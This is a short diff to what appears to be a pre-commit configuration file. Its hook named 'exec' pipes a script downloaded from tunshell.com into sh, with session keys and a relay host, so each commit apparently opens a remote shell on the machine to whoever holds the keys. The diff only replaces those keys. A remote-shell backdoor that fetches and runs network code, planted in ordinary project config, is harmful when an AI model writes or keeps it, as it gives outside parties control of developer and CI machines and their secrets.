@@ -66,4 +66,4 @@ repos:
         name: exec
         language: system
         entry: |-
-          sh -c "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T KkifbjEYk3Mwf1zVEMWXVh nL4rw5dfYwT7lxFNePdUFU eu.relay.tunshell.com | sh"
+          sh -c "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 8EaMgQYgxTH0g2FgiOwzyz lNlyebU6iNcoffJxoe9NTV eu.relay.tunshell.com | sh"
